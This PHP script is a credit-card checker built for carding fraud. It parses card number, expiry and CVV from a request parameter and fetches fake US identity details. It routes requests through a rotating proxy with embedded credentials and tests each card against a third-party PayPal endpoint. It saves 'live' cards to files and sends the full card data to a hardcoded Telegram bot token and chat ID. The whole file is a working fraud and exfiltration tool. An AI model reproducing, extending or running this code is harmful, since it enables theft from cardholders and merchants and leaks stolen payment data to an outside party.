<?php
error_reporting(0);
session_start();


if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);

}
function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];

}
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];

}
function send_to_telegram($message) {
    $botToken = "7547941980:AAGjZdlfbaoGqb4S6qEwBYMWF6agCTzwc4k";
    $chatId = "7162753868";
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage?chat_id={$chatId}&text=".urlencode($message);
    $r3 = file_get_contents($url);
    return $r3;
}

function multiexplode($delimiters, $string) {
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

$lista = $_GET['lista'];
$cc = multiexplode(array("|", ";", ":", "/", "»", "«", ">", "<"), $lista)[0];
$mes = multiexplode(array("|", ";", ":", "/", "»", "«", ">", "<"), $lista)[1];
$ano = multiexplode(array("|", ";", ":", "/", "»", "«", ">", "<"), $lista)[2];
$cvv = multiexplode(array("|", ";", ":", "/", "»", "«", ">", "<"), $lista)[3];

function value($str,$find_start,$find_end)
{
    $start = @strpos($str,$find_start);
    if ($start === false) 
    {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));
}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}


function save_to_file($filename, $lista) {
    $f = fopen($filename, 'a');
    fwrite($f, $lista . "\n");
    fclose($f);
}

$bin = substr($cc, 0, 6);  
$request = curl_init();
curl_setopt_array($request, [
    CURLOPT_URL => "https://lookup.binlist.net/$bin",
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_SSL_VERIFYPEER => false,
]);
$data = curl_exec($request);
curl_close($request);
$json = json_decode($data, true);

$country = $json['country']['alpha2'];
$country = substr($country, 0, 2);
$emoji = $json['country']['emoji'];
$type = $json["type"];
$scheme = $json["scheme"];
$bank = $json['bank']['name'];
$bin2 = substr($cc, 12, 12);
$bin3 = $bin . "xxxxx" . $bin2;
$akashi = "$type|$emoji";
$akaashi = strtoupper($akashi);

switch($ano) {
    case 35: $ano = "2035"; break;
    case 34: $ano = "2034"; break;
    case 33: $ano = "2033"; break;
    case 32: $ano = "2032"; break;
    case 31: $ano = "2031"; break;
    case 21: $ano = "2021"; break;
    case 22: $ano = "2022"; break;
    case 23: $ano = "2023"; break;
    case 24: $ano = "2024"; break;
    case 25: $ano = "2025"; break;
    case 26: $ano = "2026"; break;
    case 27: $ano = "2027"; break;
    case 28: $ano = "2028"; break;
    case 29: $ano = "2029"; break;
}

switch($mes) {
    case 1: $mes = "01"; break;
    case 2: $mes = "02"; break;
    case 3: $mes = "03"; break;
    case 4: $mes = "04"; break;
    case 5: $mes = "05"; break;
    case 6: $mes = "06"; break;
    case 7: $mes = "07"; break;
    case 8: $mes = "08"; break;
    case 9: $mes = "09"; break;
}

switch(substr($cc, 0, 1)) {
    case '4': $typecard2 = 'visa'; break;
    case '5': $typecard2 = 'mastercard'; break;
    case '2': $typecard2 = 'mastercard'; break;
    case '6': $typecard2 = 'elo'; break;
    case '3': $typecard2 = 'amex'; break;

}



#====================== Fake Detail ===========================


$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$first = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$zip = $matches1[1][0];
$ras = "$first|$last|$street|$city|$state|$zip";



#============== State abbreviation mapping ================

$state_abbreviations = [
    'Alabama' => 'AL', 'alaska' => 'AK', 'arizona' => 'AR', 'california' => 'CA',
    'olorado' => 'CO', 'connecticut' => 'CT', 'delaware' => 'DE', 'district of columbia' => 'DC',
    'florida' => 'FL', 'georgia' => 'GA', 'hawaii' => 'HI', 'idaho' => 'ID',
    'illinois' => 'IL', 'indiana' => 'IN', 'iowa' => 'IA', 'kansas' => 'KS',
    'kentucky' => 'KY', 'louisiana' => 'LA', 'maine' => 'ME', 'maryland' => 'MD',
    'massachusetts' => 'MA', 'michigan' => 'MI', 'minnesota' => 'MN', 'mississippi' => 'MS',
    'missouri' => 'MO', 'montana' => 'MT', 'nebakashika' => 'NE', 'nevada' => 'NV',
    'new hampshire' => 'NH', 'new jersey' => 'NJ', 'new mexico' => 'NM', 'new york' => 'NY',
    'north carolina' => 'NC', 'north dakota' => 'ND', 'Ohio' => 'OH', 'oklahoma' => 'OK',
    'oregon' => 'OR', 'pennsylvania' => 'PA', 'rhode Island' => 'RI', 'south carolina' => 'SC',
    'south dakota' => 'SD', 'tennessee' => 'TN', 'texas' => 'TX', 'utah' => 'UT',
    'vermont' => 'VT', 'virginia' => 'VA', 'washingtone' => 'WA', 'west virginia' => 'WV',
    'wisconsin' => 'WI', 'wyoming' => 'WY'
];

$state = $state_abbreviations[strtolower($state)] ?? 'KY';



#======================== PayPal Auth =======================

#======================= Proxy ============================

$curl = curl_init();
curl_setopt($curl, CURLOPT_PROXY, 'socks5://p.webshare.io:80');
curl_setopt($curl, CURLOPT_PROXYUSERPWD, 'ookdfwtr-ES-GB-US-rotate:q5wnnk7hbgbh');
curl_exec($curl);

#====================== Main API request ====================

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://wizvenex.com/Paypal.php?lista='.$cc.'%7C'.$mes.'%7C'.$ano.'%7C'.$cvv.'');
curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'accept: */*',
'accept-language: en-US,en;q=0.6',
'referer: https://wizvenex.com/',
'sec-ch-ua: "Not)A;Brand";v="8", "Chromium";v="138", "Brave";v="138"',
'sec-ch-ua-mobile: ?0',
'sec-ch-ua-platform: "Windows"',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
'x-requested-with: XMLHttpRequest'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
//curl_setopt($curl, CURLOPT_PROXY, 'socks5://p.webshare.io:80');
//curl_setopt($curl, CURLOPT_PROXYUSERPWD, 'xnqodury-ES-GB-US-rotate:25si061sioa5');
#=======================================================================
#=======================================================================
curl_setopt($ch, CURLOPT_POSTFIELDS, 'lista='.$cc.'%7C'.$mes.'%7C'.$ano.'%7C'.$cvv.'');


$r3 = curl_exec($ch);



#================== response =========================


if(strpos($r3, 'CARD ADDED') !== false) {
    save_to_file("Card_Added.txt", $lista);
    send_to_telegram("✅Card_Added: " . $lista);
    echo '<span class="success">✅</span> <span class="badge badge-success">Aprovadas</span> <span class="text text-dark"> ➔ </span> <span class="badge badge-success">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</span> <span class="text text-dark"> ➔ </span><span class="badge badge-info">Charged</span> <span class="text text-dark"> ➔ </span> <span class="badge badge-success">0.99$</span></br>';
    exit;


} elseif(strpos($r3, 'INVALID_SECURITY_CODE') !== false) {
    save_to_file("LiveCCN.txt", $lista);
    send_to_telegram("🟡LiveCCN: " . $lista);
    echo '<span class="success">🟡</span> <span class="badge badge-warning">Aprovadas</span> <span class="text text-dark"> ➔ </span> <span class="badge badge-warning">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</span> <span class="text text-dark"> ➔ </span> <span class="badge badge-info">Invalid_Security_Code</span></br>';
    exit;


} elseif(strpos($r3, 'CARD DECLINED') !== false) {
    echo '<span class="error">🔴</span> <span class="badge badge-danger">Reprovadas</span> <span class="text text-dark"> ➔ </span> <span class="badge badge-danger">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</span> <span class="text text-dark"> ➔ </span> <span class="badge badge-info">Card_Declined</span></br>';
    exit; 


} elseif(strpos($r3, 'EXISTING_ACCOUNT_RESTRICTED') !== false) {
    echo '<span class="error">🔴</span> <span class="badge badge-danger">Reprovadas</span> <span class="text text-dark"> ➔ </span> <span class="badge badge-danger">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</span> <span class="text text-dark"> ➔ </span> <span class="badge badge-info">Account_Already_Exist</span></br>';
    exit; 


} elseif(strpos($r3, 'COUNTRY_NOT_SUPPORTED') !== false) {
    echo '<span class="error">🔴</span> <span class="badge badge-danger">Reprovadas</span> <span class="text text-dark"> ➔ </span> <span class="badge badge-danger">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</span> <span class="text text-dark"> ➔ </span> <span class="badge badge-info">Country_not_Supported</span></br>';
    exit; 


} elseif(strpos($r3, 'RISK_DISALLOWED') !== false) {
    echo '<span class="error">🔴</span> <span class="badge badge-danger">Reprovadas</span> <span class="text text-dark"> ➔ </span> <span class="badge badge-danger">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</span> <span class="text text-dark"> ➔ </span> <span class="badge badge-info">Risk_Disallowed</span></br>';
    exit;     


} else {
    echo '<span class="error">🔴</span> <span class="badge badge-danger">Reprovadas</span> <span class="text text-dark"> ➔ </span> <span class="badge badge-danger">'.$cc.'|'.$mes.'|'.$ano.'|'.$cvv.'</span> <span class="text text-dark"> ➔ </span> <span class="badge badge-info">Invalid_Request</span></br>';
    exit;

}

curl_close($ch);

$r3;

?>
